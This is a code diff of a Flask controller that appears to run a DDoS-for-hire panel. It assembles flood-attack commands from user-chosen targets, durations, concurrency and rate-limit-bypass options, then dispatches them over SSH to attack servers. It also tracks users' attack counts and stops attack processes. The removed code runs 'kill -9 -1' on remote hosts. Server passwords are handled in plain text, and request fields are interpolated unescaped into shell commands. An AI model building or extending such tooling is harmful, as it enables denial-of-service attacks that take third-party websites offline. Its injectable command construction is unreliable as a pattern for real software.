@@ -8,11 +8,9 @@ from app.models.attack_log import AttackLog
 from app.services.response import Response
 from app.models.user_log import UserLog
 from app.models.server import Server
-from app.models.team import Team
 from app.models.user import User
 from datetime import datetime
 from app.db import db
-import paramiko
 import pytz
 
 vn_timezone = pytz.timezone('Asia/Ho_Chi_Minh') 
@@ -51,7 +49,7 @@ class AttackController:
         bypassRateLimitValue = data["bypass_ratelimit"]
         coreStrengthValue = data["core_strength"]
         modeValue = data["mode"]
-        concurrentValue = data["concurrents"]
+        concurrentValue = int(data["concurrents"])
         requestCount = data["request"]
         typeAttack = data["typeAttack"]
         death_sword_http = data.get("death_sword_http", "")
@@ -67,9 +65,9 @@ class AttackController:
                 user.increment_attack_count()
                 return Response.error(f"SITE BLOCKED", code=400)
 
-            command = f'{modeValue} {domain} {attackTimeValue} {concurrentValue} {requestCount} {coreStrengthValue} --debug true --bypass true --auth true {death_sword_http}--debug true --ratelimit {bypassRateLimitValue}'
+            command = f'{modeValue} {domain} {attackTimeValue} {concurrentValue} {requestCount} {coreStrengthValue} --debug true --bypass true --auth true {death_sword_http}--debug true {bypassRateLimitValue}'
             
-            if typeAttack == 'hyna_valkyra':
+            if 'phimsex' in modeValue:
                 command = f'{modeValue} {domain} -s {attackTimeValue} -t {concurrentValue} -r {requestCount} -p {coreStrengthValue} {death_sword_http} {bypassRateLimitValue}'
 
             if currentUser.isAdmin is False:
@@ -91,106 +89,16 @@ class AttackController:
                 )
                 db.session.add(log_entry)
                 db.session.commit()
-                
                 return Response.success(ServerManager.server_only(server_ip, server_username, server_password, command))
             else:
                 servers_data = data["servers"]
                 servers_query = Server.query.filter(Server.id.in_(servers_data)).all()
                 servers = [server.to_dict() for server in servers_query]
-                print(f"Servers being processed: {servers}")
                 return Response.success(ServerManager.server_multi(servers, command))
             
         except Exception as e:
             return Response.error(str(e), code=400)
-    # cancel multiple processes đang dở
-    def stop_multiple_processes(self):
-        currentUser = request.currentUser
-        data = request.get_json()
-        pids = data.get('pid', [])
-
-        if not pids:
-            return jsonify({
-                "status": "error",
-                "message": "No PIDs provided"
-            }), 400
-        
-        results = {}
-
-        if not server_hostnames:
-            return jsonify({
-                "status": "error",
-                "message": "No server hostnames provided"
-            }), 400
-            
-        # Check if user has access to these servers
-        if currentUser.get('team_id'):
-            team = Team.query.get(currentUser['team_id'])
-            if team:
-                authorized_servers = Server.query.filter(Server.id.in_(team.servers)).all()
-                authorized_ips = [server.ip for server in authorized_servers]
-                
-                # Check if all requested servers are authorized
-                for hostname in server_hostnames:
-                    if hostname not in authorized_ips:
-                        return jsonify({
-                            "status": "error",
-                            "message": f"Unauthorized access to server: {hostname}"
-                        }), 403
-        
-        # Terminate processes on each server
-        results = {}
-        for hostname in server_hostnames:
-            try:
-                # Find server credentials
-                server = Server.query.filter_by(ip=hostname).first()
-                if not server:
-                    results[hostname] = {
-                        "status": "error",
-                        "message": "Server not found"
-                    }
-                    continue
-                
-                # Connect to the server
-                sshClient = paramiko.SSHClient()
-                sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-                sshClient.connect(hostname, username=server.username, password=server.password)
-                
-                # Execute kill command
-                stdin, stdout, stderr = sshClient.exec_command("kill -9 -1")
-                
-                # Get output and errors
-                error = stderr.read().decode()
-                if error:
-                    results[hostname] = {
-                        "status": "error",
-                        "message": error
-                    }
-                else:
-                    results[hostname] = {
-                        "status": "success",
-                        "message": "Server processes terminated"
-                    }
-                
-                sshClient.close()
-            except Exception as e:
-                results[hostname] = {
-                    "status": "error",
-                    "message": str(e)
-                }
-                
-        # Check overall status
-        if all(result["status"] == "success" for result in results.values()):
-            return jsonify({
-                "status": "success",
-                "message": "All server processes terminated successfully",
-                "results": results
-            }), 200
-        else:
-            return jsonify({
-                "status": "partial_success" if any(result["status"] == "success" for result in results.values()) else "error",
-                "message": "Some or all server process terminations failed",
-                "results": results
-            }), 207  # Using 207 Multi-Status for partial success
+    
     # cancel all server attack
     def terminate_server_attack(self, logId: int, serverHostname: str):
         currentUser = request.currentUser
@@ -265,46 +173,46 @@ class AttackController:
         except Exception as e:
             return Response.error(message=str(e), code=404)
     # cancel process
-    def stop_process(self, pid=None):
+    def stop_process(self):
         try:
+            data = request.get_json()
+            pids = data.get('pids', [])
+            server_ids = data.get('server_ids', [])
             currentUser = request.currentUser
 
             if currentUser.isAdmin is False:
-                
-                if not isinstance(pid, int) or pid <= 0:
-                    return Response.error("Invalid PID", code=400)
+                for pid in pids:
+                    if not isinstance(pid, int) or pid <= 0:
+                        return Response.error("Invalid PID", code=400)
 
-                server_id = currentUser.server_id
-                servers_data = Server.query.get(server_id)
-                if not servers_data:
-                    return Response.error("Server not found", 404)
+                    server_id = currentUser.server_id
+                    servers_data = Server.query.get(server_id)
+                    if not servers_data:
+                        return Response.error("Server not found", 404)
 
-                server_ip = servers_data.to_dict()['ip']
-                server_username = servers_data.to_dict()['username']
-                server_password = servers_data.to_dict()['password']
+                    server_ip = servers_data.to_dict()['ip']
+                    server_username = servers_data.to_dict()['username']
+                    server_password = servers_data.to_dict()['password']
 
-                return Response.success(ServerManager.server_stop_single(server_ip, server_username, server_password, pid))
+                    result = ServerManager.server_stop_multi(server_ip, server_username, server_password, pids)
 
+                return Response.success(result)
             else:
-                data = request.get_json()
-                server_id = data.get('server_id') if data else None
-                if not server_id:
-                    return Response.error("Missing server_id for admin operation", 400)
+                for i, (pid, server_id) in enumerate(zip(pids, server_ids)):
+                    servers_data = Server.query.get(server_id)
+                    if not servers_data:
+                        return Response.error("Server not found", 404)
 
-                servers_data = Server.query.get(server_id)
-                if not servers_data:
-                    return Response.error("Server not found", 404)
-
-                server_dict = servers_data.to_dict()
-                server_ip = server_dict['ip']
-                server_username = server_dict['username']
-                server_password = server_dict['password']
-
-                return Response.success(ServerManager.server_stop_single(
-                    server_ip, 
-                    server_username, 
-                    server_password, 
-                    pid
-                ))
+                    server_dict = servers_data.to_dict()
+                    server_ip = server_dict['ip']
+                    server_username = server_dict['username']
+                    server_password = server_dict['password']
+                    result = ServerManager.server_stop_multi(
+                        server_ip, 
+                        server_username, 
+                        server_password, 
+                        [pid]
+                    )
+                return Response.success(result)
         except Exception as e:
             return Response.error(message=str(e), code=404)
